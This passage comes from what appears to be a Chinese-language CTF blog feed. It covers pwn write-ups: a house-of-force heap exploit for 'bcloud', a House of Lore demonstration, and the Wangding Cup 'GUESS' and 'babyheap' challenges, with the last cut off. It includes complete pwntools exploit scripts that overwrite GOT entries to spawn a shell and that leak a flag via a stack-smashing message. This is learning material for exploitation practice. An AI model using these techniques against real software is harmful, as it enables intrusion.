class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">unsigned int get_org_host()</span><br><span class="line">&#123;</span><br><span class="line">  char org; // [esp+1Ch] [ebp-9Ch]</span><br><span class="line">  char *o; // [esp+5Ch] [ebp-5Ch]</span><br><span class="line">  int host; // [esp+60h] [ebp-58h]</span><br><span class="line">  char *h; // [esp+A4h] [ebp-14h]</span><br><span class="line">  unsigned int v5; // [esp+ACh] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(0x14u);</span><br><span class="line">  memset(&amp;org, 0, 0x90u);</span><br><span class="line">  puts(&quot;Org:&quot;);</span><br><span class="line">  read_str((int)&amp;org, 0x40, &apos;\n&apos;);</span><br><span class="line">  puts(&quot;Host:&quot;);</span><br><span class="line">  read_str((int)&amp;host, 0x40, &apos;\n&apos;);</span><br><span class="line">  h = (char *)malloc(0x40u);</span><br><span class="line">  o = (char *)malloc(0x40u);</span><br><span class="line">  org_ptr = (int)o;</span><br><span class="line">  host_ptr = (int)h;</span><br><span class="line">  strcpy(h, (const char *)&amp;host);</span><br><span class="line">  strcpy(o, &amp;org);                             &lt;------strcpy这里出的问题</span><br><span class="line">  puts(&quot;OKay! Enjoy:)&quot;);</span><br><span class="line">  return __readgsdword(0x14u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进去之后就是一个创建编辑删除同步note的程序，show，syn，quit没什么用</p><p>new_note:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">int new_note()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line">  signed int i; // [esp+18h] [ebp-10h]</span><br><span class="line">  int length; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  for ( i = 0; i &lt;= 9 &amp;&amp; ptr[i]; ++i )          //最多十个</span><br><span class="line">    ;</span><br><span class="line">  if ( i == 10 )</span><br><span class="line">    return puts(&quot;Lack of space. Upgrade your account with just $100 :)&quot;);</span><br><span class="line">  puts(&quot;Input the length of the note content:&quot;);</span><br><span class="line">  length = get_num();</span><br><span class="line">  ptr[i] = (int)malloc(length + 4);                   //大小用户定义</span><br><span class="line">  if ( !ptr[i] )</span><br><span class="line">    exit(-1);</span><br><span class="line">  len_[i] = length;</span><br><span class="line">  puts(&quot;Input the content:&quot;);</span><br><span class="line">  read_str(ptr[i], length, &apos;\n&apos;);</span><br><span class="line">  printf(&quot;Create success, the id is %d\n&quot;, i);</span><br><span class="line">  result = i;</span><br><span class="line">  syn_inuse[i] = 0;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>edit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">int edit()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // ST1C_4</span><br><span class="line">  int i; // [esp+14h] [ebp-14h]</span><br><span class="line">  int id_ptr; // [esp+18h] [ebp-10h]</span><br><span class="line"></span><br><span class="line">  puts(&quot;Input the id:&quot;);</span><br><span class="line">  i = get_num();</span><br><span class="line">  if ( i &lt; 0 || i &gt; 9 )</span><br><span class="line">    return puts(&quot;Invalid ID.&quot;);</span><br><span class="line">  id_ptr = ptr[i];</span><br><span class="line">  if ( !id_ptr )</span><br><span class="line">    return puts(&quot;Note has been deleted.&quot;);</span><br><span class="line">  v1 = len_[i];</span><br><span class="line">  syn_inuse[i] = 0;</span><br><span class="line">  puts(&quot;Input the new content:&quot;);</span><br><span class="line">  read_str(id_ptr, v1, &apos;\n&apos;);</span><br><span class="line">  return puts(&quot;Edit success.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">int delete()</span><br><span class="line">&#123;</span><br><span class="line">  int i; // [esp+18h] [ebp-10h]</span><br><span class="line">  void *ptr_; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  puts(&quot;Input the id:&quot;);</span><br><span class="line">  i = get_num();</span><br><span class="line">  if ( i &lt; 0 || i &gt; 9 )</span><br><span class="line">    return puts(&quot;Invalid ID.&quot;);</span><br><span class="line">  ptr_ = (void *)ptr[i];</span><br><span class="line">  if ( !ptr_ )</span><br><span class="line">    return puts(&quot;Note has been deleted.&quot;);</span><br><span class="line">  ptr[i] = 0;</span><br><span class="line">  len_[i] = 0;</span><br><span class="line">  free(ptr_);</span><br><span class="line">  return puts(&quot;Delete success.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>主程序看了一遍又一遍，还是没发现任何漏洞。回头看，问题出现在前面：</p><p>name是用read读取的，结尾没有’\x00’;而输出是以读取到’\x00’为止的，那么就可以泄露堆地址。<br>(ps: 大概是在strcpy到指定大小的地址时，如果写入大小与目标地址大小相同，则在后面会添加目标地址的指针。具体原因目前未明)</p><p>org &amp; host 这边的strcpy操作会自动在结尾加’\n’,结果就是在一通复制完之后，可以修改topchunk的size使之变为0xffffffff，满足houseofforce条件</p><p>之后进入程序。</p><p>计算大小将topchunk调整到bss段的len[]及ptr[]附近，欺骗程序chunk的分配。之后的思路在exp中写的很清楚</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level =&apos;debug&apos;</span><br><span class="line">sh = process(&apos;./bcloud&apos;)</span><br><span class="line">elf = ELF(&apos;./bcloud&apos;)</span><br><span class="line">libc = ELF(&apos;libc-2.19.so&apos;)</span><br><span class="line"></span><br><span class="line">#-----------get heap_base------------</span><br><span class="line">sh.recvuntil(&apos;Input your name:\n&apos;)</span><br><span class="line">sh.send(&apos;a&apos;*64)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.recvuntil(&apos;a&apos;*64)</span><br><span class="line">heap_base = u32(sh.recv()[:4])-8</span><br><span class="line">print &apos;heap_base: &apos;+hex(heap_base)</span><br><span class="line"></span><br><span class="line">#---------house of force----------------!!!!!!!!!!</span><br><span class="line">sh.send(&apos;b&apos;*0x40)</span><br><span class="line">#sh.recvuntil(&apos;Host:&apos;)</span><br><span class="line">sh.sendline(p32(0xffffffff))</span><br><span class="line">#b(0x8048978)</span><br><span class="line">#gdb.attach(sh)#,&apos;b&apos; *0x804895e)</span><br><span class="line"></span><br><span class="line">#------------calc malloc size----------------!!!!!!!!!!!!</span><br><span class="line">topchunk_addr = heap_base + 0xd8</span><br><span class="line">print &apos;topchunk_addr: &apos;+hex(topchunk_addr)</span><br><span class="line">len_addr  = 0x0804b0a0</span><br><span class="line">list_addr = 0x0804b120</span><br><span class="line">target_addr = len_addr - 8</span><br><span class="line">size = target_addr - topchunk_addr-4-7</span><br><span class="line">print str(size)</span><br><span class="line">#----------edit topchunk to size[i]--------------</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;option---&gt;&gt;\n&apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">#sh.recv()</span><br><span class="line">sh.sendline(str(size-4))</span><br><span class="line">sh.recv()</span><br><span class="line">sh.send(&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#--------------edit ptr to got_addr---------------</span><br><span class="line"></span><br><span class="line">payload = p32(16) *3 + (list_addr-len_addr-12)*&apos;a&apos;</span><br><span class="line">payload += p32(elf.got[&apos;free&apos;]) +p32( elf.got[&apos;atoi&apos;])*2</span><br><span class="line">#+elf.got[&apos;atoi&apos;] </span><br><span class="line"></span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">#sh.recv()</span><br><span class="line">sh.sendline(&apos;1000&apos;)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#sh.recv()</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line">sh.sendline(&apos;0&apos;)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(p32(elf.plt[&apos;puts&apos;]))</span><br><span class="line"></span><br><span class="line">#---------leak atoi_addr to get system_addr-----------------</span><br><span class="line">sh.sendline(&apos;4&apos;)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">atoi_plt = sh.recv()[:4]</span><br><span class="line">#sh.recv()</span><br><span class="line">system_addr = u32(atoi_plt) - libc.symbols[&apos;atoi&apos;] + libc.symbols[&apos;system&apos;]</span><br><span class="line"></span><br><span class="line">print &apos;system_addr: &apos;+hex(system_addr)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#-------------edit atoi to system------------------</span><br><span class="line"></span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line">sh.sendline(&apos;2&apos;)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(p32(system_addr))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#--------------------- get shell------------------</span><br><span class="line">sh.sendlineafter(&apos;option---&gt;&gt;&apos;, &apos;/bin/sh\x00&apos;)</span><br><span class="line">#sh.send(&apos;/bin/sh\x00&apos;)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn2.6-HouseOfLore</title>
      <link href="/2019/01/22/introduction-to-pwn2-6-houseoflore/"/>
      <url>/2019/01/22/introduction-to-pwn2-6-houseoflore/</url>
      <content type="html"><![CDATA[<h1 id="House-of-Lore-原理"><a href="#House-of-Lore-原理" class="headerlink" title="House of Lore 原理"></a>House of Lore 原理</h1><p>看了下原理，没有太多的东西，和house of spirit的思想是一样的，只是spirit是在fastbin大小的chunk范围内伪造fake chunk，而House of Lore是small bin 与 large bin大小的chunk ， 不过后来因为large bin添加了保护措施，便无法再利用。</p><p>house of lore 相比会麻烦一点，毕竟smallbin的检查比较多，因而大部分准备都是为了能够绕过检测。</p><p>单拿例子说一下吧，有对应的练习之后再加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">struct small_chunk &#123;</span><br><span class="line">  size_t prev_size;</span><br><span class="line">  size_t size;</span><br><span class="line">  struct small_chunk *fd;</span><br><span class="line">  struct small_chunk *bk;</span><br><span class="line">  char buf[0x64];               // chunk falls in smallbin size range</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct small_chunk fake_chunk;                  // At address 0x7ffdeb37d050</span><br><span class="line">struct small_chunk another_fake_chunk;</span><br><span class="line">struct small_chunk *real_chunk;</span><br><span class="line">unsigned long long *ptr, *victim;</span><br><span class="line">int len;</span><br><span class="line"></span><br><span class="line">len = sizeof(struct small_chunk);</span><br><span class="line"></span><br><span class="line">// Grab two small chunk and free the first one</span><br><span class="line">// This chunk will go into unsorted bin</span><br><span class="line">ptr = malloc(len);                              // points to address 0x1a44010</span><br><span class="line"></span><br><span class="line">// The second malloc can be of random size. We just want that</span><br><span class="line">// the first chunk does not merge with the top chunk on freeing</span><br><span class="line">malloc(len);                                    // points to address 0x1a440a0</span><br><span class="line"></span><br><span class="line">// This chunk will end up in unsorted bin</span><br><span class="line">free(ptr);</span><br><span class="line"></span><br><span class="line">real_chunk = (struct small_chunk *)(ptr - 2);   // points to address 0x1a44000</span><br><span class="line"></span><br><span class="line">// Grab another chunk with greater size so as to prevent getting back</span><br><span class="line">// the same one. Also, the previous chunk will now go from unsorted to</span><br><span class="line">// small bin</span><br><span class="line">malloc(len + 0x10);                             // points to address 0x1a44130</span><br><span class="line"></span><br><span class="line">// Make the real small chunk&apos;s bk pointer point to &amp;fake_chunk</span><br><span class="line">// This will insert the fake chunk in the smallbin</span><br><span class="line">real_chunk-&gt;bk = &amp;fake_chunk;</span><br><span class="line">// and fake_chunk&apos;s fd point to the small chunk</span><br><span class="line">// This will ensure that &apos;victim-&gt;bk-&gt;fd == victim&apos; for the real chunk</span><br><span class="line">fake_chunk.fd = real_chunk;</span><br><span class="line"></span><br><span class="line">// We also need this &apos;victim-&gt;bk-&gt;fd == victim&apos; test to pass for fake chunk</span><br><span class="line">fake_chunk.bk = &amp;another_fake_chunk;</span><br><span class="line">another_fake_chunk.fd = &amp;fake_chunk;</span><br><span class="line"></span><br><span class="line">// Remove the real chunk by a standard call to malloc</span><br><span class="line">malloc(len);                                    // points at address 0x1a44010</span><br><span class="line"></span><br><span class="line">// Next malloc for that size will return the fake chunk</span><br><span class="line">victim = malloc(len);                           // points at address 0x7ffdeb37d060</span><br></pre></td></tr></table></figure><p>注释已经说得很清楚了，就不再赘述了</p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>网鼎杯pwn复现</title>
      <link href="/2018/12/28/%E7%BD%91%E9%BC%8E%E6%9D%AFpwn%E5%A4%8D%E7%8E%B0/"/>
      <url>/2018/12/28/%E7%BD%91%E9%BC%8E%E6%9D%AFpwn%E5%A4%8D%E7%8E%B0/</url>
      <content type="html"><![CDATA[<p><em>第一次打比赛便被网鼎杯血虐，当时栈溢出的水平不足以达到唯一的一个栈溢出的题目的要求，堆就更不必多说了。</em><br><em>现在在学习堆的中间回来看看有没有能力去复现当时的题。</em></p><h1 id="GUESS"><a href="#GUESS" class="headerlink" title="GUESS"></a>GUESS</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>还是比较清晰的，将flag.txt的内容读到了栈上，我们就是想方设法将其输出出来；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  __WAIT_STATUS stat_loc; // [rsp+14h] [rbp-8Ch]</span><br><span class="line">  int v5; // [rsp+1Ch] [rbp-84h]</span><br><span class="line">  __int64 i; // [rsp+20h] [rbp-80h]</span><br><span class="line">  __int64 max_num_3; // [rsp+28h] [rbp-78h]</span><br><span class="line">  char flag_is_here; // [rsp+30h] [rbp-70h]</span><br><span class="line">  char s2; // [rsp+60h] [rbp-40h]</span><br><span class="line">  unsigned __int64 canary; // [rsp+98h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(0x28u);</span><br><span class="line">  max_num_3 = 3LL;</span><br><span class="line">  LODWORD(stat_loc.__uptr) = 0;</span><br><span class="line">  i = 0LL;</span><br><span class="line">  setvbuf_and_alarm();</span><br><span class="line">  HIDWORD(stat_loc.__iptr) = open(&quot;./flag.txt&quot;, 0, a2);</span><br><span class="line">  if ( HIDWORD(stat_loc.__iptr) == -1 )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(&quot;./flag.txt&quot;);</span><br><span class="line">    _exit(-1);</span><br><span class="line">  &#125;</span><br><span class="line">  read(SHIDWORD(stat_loc.__iptr), &amp;flag_is_here, 0x30uLL);</span><br><span class="line">  close(SHIDWORD(stat_loc.__iptr));             // read flag.txt </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">  puts(&quot;This is GUESS FLAG CHALLENGE!&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( i &gt;= max_num_3 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;you have no sense... bye :-) &quot;);</span><br><span class="line">      return 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = get_fork();</span><br><span class="line">    if ( !v5 )</span><br><span class="line">      break;</span><br><span class="line">    ++i;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Please type your guessing flag&quot;);</span><br><span class="line">  gets(&amp;s2);</span><br><span class="line">  if ( !strcmp(&amp;flag_is_here, &amp;s2) )</span><br><span class="line">    puts(&quot;You must have great six sense!!!! :-o &quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;You should take more effort to get six sence, and one more challenge!!&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>程序有canary，溢出点也很清晰；<br>这里就涉及到了canary的ssp leak；<br>因为只有三次机会，我们需要的就是栈地址；<br>所以第一次得到libc地址，第二次可以用environ变量得到栈地址，第三次读flag即可。</p><p>当时卡住的地方是栈地址的泄露：<br>  栈的地址可以通过libc中的一个变量 _environ变量泄露出来。因为在libc中的全局变量 environ储存着该程序环境变量的地址，而环境变量是储存在栈上的，所以可以泄露栈地址，进而计算出flag在栈上的地址。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./GUESS&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">puts_got = 0x602020</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;guessing flag\n&quot;)</span><br><span class="line">sh.sendline(p64(puts_got)*0x100)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;*** stack smashing detected ***: &quot;)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(sh.recvn(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc.address = puts_addr- libc.symbols[&apos;puts&apos;]</span><br><span class="line"></span><br><span class="line">environ = libc.symbols[&apos;environ&apos;]</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;guessing flag\n&quot;)</span><br><span class="line">sh.sendline(p64(environ)*0x100)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;*** stack smashing detected ***: &quot;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">stack_addr = u64(sh.recvn(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;guessing flag\n&quot;)</span><br><span class="line">sh.sendline(p64(stack_addr -0x168)*0x100)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">结果如下：</span><br><span class="line"></span><br><span class="line">You should take more effort to get six sence, and one more challenge!!</span><br><span class="line">*** stack smashing detected ***: flag&#123;Th1s_1S_Fl3g&#125;</span><br><span class="line">me terminated</span><br></pre></td></tr></table></figure><h1 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>题目写的还是比较清晰的，功能如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int menu()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;1.alloc&quot;);</span><br><span class="line">  puts(&quot;2.edit&quot;);</span><br><span class="line">  puts(&quot;3.show&quot;);</span><br><span class="line">  puts(&quot;4.free&quot;);</span><br><span class="line">  puts(&quot;5.exit&quot;);</span><br><span class="line">  return printf(&quot;Choice:&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>alloc 会分配固定0x30大小的chunk，最多alloc 9次；<br>edit 可以选择修改chunk，最多edit 3次 ， 与alloc均不存在溢出的可能；<br>show 会将内容打印出来；<br>free 将chunk free掉，有明显的UAF漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec babyheap</span><br><span class="line">[*] &apos;/home/sirius/tikool/wangdingbei/babyheap/babyheap&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>保护基本上全开，为了拿到shell，我们选择修改malloc_hook或free_hook来执行system(‘/bin/sh’)或使用one_gadget拿shell；</p><p>为了能够修改free_hook,我们需要leak libc的基址，但是程序只会固定malloc(0x20),也就是0x30大小的chunk，该chunk属于fastbin，而众所周知，fastbin是没办法泄露libc基址的，因此我们需要smallbin；</p><p>为了能够搞到smallbin，我们决定利用free的漏洞，当连续free两个chunk时，后free的fastbin的fd指针会指向先free的chunk，然后我们show便可以泄露堆地址；</p><p>当泄露出堆地址之后，我们可以修改fd指针的指向地址，这样malloc时便会到我们想要的地址，所以我们有机会来让修改chunk能够使其去伪造smallbin大小的chunk，这样想方设法将其free之后，其fd指针与bk指针指向&lt;main_arena+88&gt;处，这样show便可以泄露libc地址。</p><p>不过最终要控制malloc 与 edit的次数，在有限的次数内完成功能， 不得已的话再想办法修改edit的次数限制。</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 